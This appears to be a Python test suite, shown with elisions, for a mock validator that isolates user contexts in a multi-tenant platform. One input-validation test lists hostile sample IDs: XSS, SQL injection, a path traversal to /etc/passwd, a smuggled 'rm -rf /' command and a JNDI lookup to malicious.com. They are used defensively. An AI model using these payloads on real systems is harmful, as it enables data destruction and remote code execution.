...
from shared.types.core_types import UserID, ThreadID, ExecutionID, WebSocketID, SessionID, ensure_user_id, ensure_thread_id
...
class MockUserContextIsolationValidator:
    ...
    def _initialize_isolation_rules(self) -> Dict[str, Any]:
        ...
        return {'strict_user_separation': True, 'no_shared_execution_contexts': True, 'isolated_websocket_connections': True, 'separate_agent_state_per_user': True, 'user_specific_cache_keys': True, 'cross_user_access_forbidden': True, 'session_user_binding_required': True, 'execution_user_validation_required': True, 'resource_access_authorization_required': True, 'context_lifetime_limits': {'session_max_hours': 24, 'execution_max_minutes': 30, 'websocket_max_hours': 8}}

    def create_user_context(self, user_id: UserID, session_id: SessionID, thread_id: ThreadID, execution_id: ExecutionID, websocket_id: Optional[WebSocketID]=None) -> Dict[str, Any]:
        """Business logic: Create isolated user context with proper boundaries."""
        if not self._validate_user_id_format(user_id):
            return {'success': False, 'error': 'Invalid user ID format', 'security_risk': 'Potential ID injection attempt'}
        existing_conflicts = self._check_context_conflicts(user_id, session_id, execution_id)
        if existing_conflicts:
            return {'success': False, 'error': 'Context conflicts detected', 'conflicts': existing_conflicts, 'security_risk': 'Potential context pollution'}
        user_context = UserContext(user_id=user_id, session_id=session_id, thread_id=thread_id, execution_id=execution_id, websocket_id=websocket_id, isolation_level=IsolationLevel.STRICT)
        ...
        return {'success': True, 'context_id': f'{user_id}_{execution_id}', 'isolation_level': user_context.isolation_level.value, 'allowed_resources': list(user_context.allowed_resources), 'security_boundaries_established': True}

    def validate_resource_access(self, user_id: UserID, resource_identifier: str, access_type: str, requesting_context: Dict[str, Any]) -> Dict[str, Any]:
        """Business logic: Validate resource access against user isolation boundaries."""
        if user_id not in self.active_contexts:
            return {'allowed': False, 'reason': 'No active user context', 'security_risk': 'Unauthenticated access attempt'}
        user_context = self.active_contexts[user_id]
        if resource_identifier in user_context.forbidden_resources:
            violation = IsolationViolation(violation_type=SecurityThreat.CROSS_USER_ACCESS, source_user_id=user_id, target_user_id=self._extract_resource_owner(resource_identifier), resource_accessed=resource_identifier, context_type=ContextType.DATA_ACCESS, violation_time=time.time(), severity='HIGH', description=f'Attempted access to forbidden resource: {resource_identifier}')
            self.violation_history.append(violation)
            return {'allowed': False, 'reason': 'Resource access forbidden', 'security_risk': 'Potential data leak attempt', 'violation_logged': True}
        if not self._is_resource_in_user_scope(user_id, resource_identifier):
            self.cross_user_access_attempts.append({'user_id': str(user_id), 'resource': resource_identifier, 'access_type': access_type, 'timestamp': time.time(), 'context': requesting_context})
            return {'allowed': False, 'reason': 'Resource outside user scope', 'security_risk': 'Cross-user boundary violation'}
        context_validation = self._validate_request_context(user_context, requesting_context)
        if not context_validation['valid']:
            return {'allowed': False, 'reason': context_validation['error'], 'security_risk': 'Context integrity violation'}
        self.resource_access_log.append({'user_id': str(user_id), 'resource': resource_identifier, 'access_type': access_type, 'allowed': True, 'timestamp': time.time()})
        user_context.last_accessed = time.time()
        return {'allowed': True, 'reason': 'Access within user boundaries', 'access_logged': True}
    ...
    def _check_context_conflicts(self, user_id: UserID, session_id: SessionID, execution_id: ExecutionID) -> List[str]:
    ...
    def _generate_user_resource_scope(self, user_id: UserID) -> Set[str]:
        ...
        user_id_str = str(user_id)
        allowed_resources = {f'user_data:{user_id_str}', f'user_threads:{user_id_str}:*', f'user_executions:{user_id_str}:*', f'user_cache:{user_id_str}:*', f'user_websockets:{user_id_str}:*', f'user_agents:{user_id_str}:*', f'user_sessions:{user_id_str}:*'}
        shared_safe_resources = {'public_models:*', 'system_health:*', 'public_documentation:*'}
    ...
    def _generate_forbidden_resources(self, user_id: UserID) -> Set[str]:
        ...
        for other_user_id in other_user_ids:
            ...
            forbidden_resources.update({f'user_data:{other_user_str}', f'user_threads:{other_user_str}:*', f'user_executions:{other_user_str}:*', f'user_cache:{other_user_str}:*', f'user_websockets:{other_user_str}:*', f'user_agents:{other_user_str}:*', f'user_sessions:{other_user_str}:*'})
        system_forbidden = {'system_config:*', 'admin_panel:*', 'internal_metrics:*', 'other_tenant_data:*', 'global_secrets:*'}
    ...
    def _is_resource_in_user_scope(self, user_id: UserID, resource_identifier: str) -> bool:
        ...
        for allowed_pattern in user_context.allowed_resources:
            if allowed_pattern.endswith(':*'):
                pattern_prefix = allowed_pattern[:-2]
    ...
    def _validate_request_context(self, user_context: UserContext, requesting_context: Dict[str, Any]) -> Dict[str, Any]:
        ...
        if request_session_id and request_session_id != str(user_context.session_id):
            return {'valid': False, 'error': 'Session ID mismatch', 'security_issue': 'Potential session hijacking'}
        ...
        if request_execution_id and request_execution_id != str(user_context.execution_id):
            return {'valid': False, 'error': 'Execution ID mismatch', 'security_issue': 'Potential context confusion'}
        request_websocket_id = requesting_context.get('websocket_id')
        if request_websocket_id and user_context.websocket_id and (request_websocket_id != str(user_context.websocket_id)):
            return {'valid': False, 'error': 'WebSocket ID mismatch', 'security_issue': 'Potential connection hijacking'}
        return {'valid': True}
    ...
    def detect_isolation_violations(self) -> Dict[str, Any]:
        ...
        risk_score = len(high_severity_violations) * 10 + cross_user_attempts * 5 + len(self.violation_history) * 2
        if risk_score >= 50:
        ...
        return {'total_violations': len(self.violation_history), 'high_severity_violations': len(high_severity_violations), 'cross_user_access_attempts': cross_user_attempts, 'violation_patterns': violation_patterns, 'risk_score': risk_score, 'security_status': security_status, 'isolation_effectiveness': self._calculate_isolation_effectiveness()}
    ...
    def _calculate_isolation_effectiveness(self) -> float:
        ...
        if total_access_attempts == 0:
            return 100.0
        successful_isolations = len(self.resource_access_log)
    ...
    def cleanup_expired_contexts(self) -> Dict[str, Any]:
        ...
        for user_id, context in list(self.active_contexts.items()):
            ...
            if execution_age_minutes > self.isolation_rules['context_lifetime_limits']['execution_max_minutes']:
                ...
                del self.active_contexts[user_id]
                continue
        return {'expired_contexts': len(expired_contexts), 'expired_details': expired_contexts, 'active_contexts_remaining': len(self.active_contexts), 'cleanup_successful': True}
    ...
    def generate_isolation_report(self) -> Dict[str, Any]:
        ...
        return {'isolation_summary': {'active_user_contexts': active_users, 'isolation_level': 'STRICT' if active_users > 0 else 'N/A', 'isolation_effectiveness_percentage': isolation_effectiveness, 'security_status': violation_detection['security_status']}, 'security_metrics': {'total_violations': violations_detected, 'cross_user_access_attempts': cross_user_attempts, 'high_risk_violations': violation_detection['high_severity_violations'], 'risk_score': violation_detection['risk_score']}, 'business_impact': {'customer_data_protected': active_users > 0 and violations_detected == 0, 'enterprise_compliance_status': 'COMPLIANT' if isolation_effectiveness >= 95 else 'NON_COMPLIANT', 'multi_tenant_safety': isolation_effectiveness >= 99.0, 'revenue_protection_level': 'HIGH' if isolation_effectiveness >= 95 else 'MEDIUM'}, 'recommendations': self._generate_security_recommendations(violation_detection)}
...
class TestUserContextIsolationLogic(SSotBaseTestCase):
    ...
    def test_user_context_creation_isolation_boundaries(self):
        ...
        context_result_1 = self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        ...
        context_result_2 = self.validator.create_user_context(self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2)
    ...
    def test_cross_user_resource_access_prevention(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        self.validator.create_user_context(self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2)
        user_2_resource = f'user_data:{self.test_user_2}'
        cross_access_result = self.validator.validate_resource_access(self.test_user_1, user_2_resource, 'read', {'session_id': str(self.test_session_1)})
        ...
        legitimate_access_result = self.validator.validate_resource_access(self.test_user_1, user_1_resource, 'read', {'session_id': str(self.test_session_1)})
    ...
    def test_user_id_format_validation_security(self):
        ...
        malicious_user_ids = ["<script>alert('xss')</script>", "admin'; DROP TABLE users; --", '../../../etc/passwd', 'user_id && rm -rf /', "'OR'1'='1", '${jndi:ldap://malicious.com/a}']
        for malicious_id in malicious_user_ids:
            try:
                context_result = self.validator.create_user_context(UserID(malicious_id), self.test_session_1, self.test_thread_1, self.test_execution_1)
                ...
                pass
        valid_user_ids = ['user_12345', 'enterprise_customer_001', 'test-user-abc123', 'user.name@company.com']
        valid_count = 0
        for valid_id in valid_user_ids:
            try:
                context_result = self.validator.create_user_context(UserID(valid_id), SessionID(str(uuid.uuid4())), ThreadID(f'thread_{valid_count}'), ExecutionID(f'exec_{valid_count}'))
    ...
    def test_context_conflict_detection_logic(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        conflict_result = self.validator.create_user_context(self.test_user_2, self.test_session_2, ThreadID('different_thread'), self.test_execution_1)
        ...
        session_conflict_result = self.validator.create_user_context(UserID('different_user'), self.test_session_1, ThreadID('another_thread'), ExecutionID('different_execution'))
    ...
    def test_request_context_validation_security(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        legitimate_context = {'session_id': str(self.test_session_1), 'execution_id': str(self.test_execution_1)}
        legitimate_access = self.validator.validate_resource_access(self.test_user_1, f'user_data:{self.test_user_1}', 'read', legitimate_context)
        assert legitimate_access['allowed'] is True
        hijacking_context = {'session_id': str(uuid.uuid4()), 'execution_id': str(self.test_execution_1)}
        hijacking_attempt = self.validator.validate_resource_access(self.test_user_1, f'user_data:{self.test_user_1}', 'read', hijacking_context)
        assert hijacking_attempt['allowed'] is False
        assert 'context integrity violation' in hijacking_attempt['security_risk'].lower()
        confusion_context = {'session_id': str(self.test_session_1), 'execution_id': str(uuid.uuid4())}
        confusion_attempt = self.validator.validate_resource_access(self.test_user_1, f'user_data:{self.test_user_1}', 'read', confusion_context)
    ...
    def test_isolation_violation_detection_and_logging(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        self.validator.create_user_context(self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2)
        violations_to_test = [{'user': self.test_user_1, 'resource': f'user_data:{self.test_user_2}', 'context': {'session_id': str(self.test_session_1)}, 'violation_type': 'cross_user_data_access'}, {'user': self.test_user_1, 'resource': f'user_cache:{self.test_user_2}:sensitive_data', 'context': {'session_id': str(self.test_session_1)}, 'violation_type': 'cache_boundary_violation'}, {'user': self.test_user_2, 'resource': f'user_executions:{self.test_user_1}:results', 'context': {'session_id': str(self.test_session_2)}, 'violation_type': 'execution_context_breach'}]
        for violation_test in violations_to_test:
            self.validator.validate_resource_access(violation_test['user'], violation_test['resource'], 'read', violation_test['context'])
    ...
    def test_resource_scope_pattern_matching_logic(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        user_1_str = str(self.test_user_1)
        allowed_patterns = [f'user_data:{user_1_str}', f'user_threads:{user_1_str}:thread_123', f'user_cache:{user_1_str}:optimization_results', f'user_executions:{user_1_str}:exec_456', 'public_models:gpt-4', 'system_health:status']
        for resource in allowed_patterns:
            access_result = self.validator.validate_resource_access(self.test_user_1, resource, 'read', {'session_id': str(self.test_session_1)})
            assert access_result['allowed'] is True, f'Resource {resource} should be allowed'
        forbidden_patterns = [f'user_data:{self.test_user_2}', f'user_threads:{self.test_user_2}:any_thread', 'admin_panel:configuration', 'system_config:secrets', 'global_secrets:api_keys']
    ...
    def test_context_cleanup_prevents_resource_leaks(self):
        ...
        current_time = time.time()
        recent_context = UserContext(user_id=self.test_user_1, session_id=self.test_session_1, thread_id=self.test_thread_1, execution_id=self.test_execution_1, created_at=current_time, last_accessed=current_time)
        old_session_context = UserContext(user_id=self.test_user_2, session_id=self.test_session_2, thread_id=self.test_thread_2, execution_id=self.test_execution_2, created_at=current_time - 25 * 3600, last_accessed=current_time - 25 * 3600)
        stale_execution_user = UserID('stale_user')
        stale_execution_context = UserContext(user_id=stale_execution_user, session_id=SessionID(str(uuid.uuid4())), thread_id=ThreadID('stale_thread'), execution_id=ExecutionID('stale_execution'), created_at=current_time, last_accessed=current_time - 35 * 60)
        ...
        assert cleanup_result['expired_contexts'] >= 2
    ...
    def test_isolation_report_business_metrics(self):
        ...
        self.validator.create_user_context(self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1)
        self.validator.create_user_context(self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2)
        legitimate_accesses = [f'user_data:{self.test_user_1}', f'user_cache:{self.test_user_1}:results', 'public_models:gpt-4']
        for resource in legitimate_accesses:
            self.validator.validate_resource_access(self.test_user_1, resource, 'read', {'session_id': str(self.test_session_1)})
        cross_user_attempts = [f'user_data:{self.test_user_2}', f'user_executions:{self.test_user_2}:sensitive']
    ...
    def test_multi_tenant_business_value_protection(self):
        ...
        sensitive_resources = [f'user_data:{customer_2}', f'user_cache:{customer_2}:cost_analysis_results', f'user_executions:{customer_2}:optimization_recommendations', f'user_threads:{customer_2}:competitive_analysis']
        blocked_attempts = 0
        for resource in sensitive_resources:
            access_result = self.validator.validate_resource_access(customer_1, resource, 'read', {'session_id': str(self.validator.active_contexts[customer_1].session_id)})
            if not access_result['allowed']:
                blocked_attempts += 1
        assert blocked_attempts == len(sensitive_resources), 'All cross-customer access must be blocked'
        own_resources = [f'user_data:{customer_1}', f'user_cache:{customer_1}:my_analysis', f'user_executions:{customer_1}:my_optimization']
        allowed_accesses = 0
        ...
        assert business_impact['multi_tenant_safety'] is True or final_report['isolation_summary']['isolation_effectiveness_percentage'] >= 95
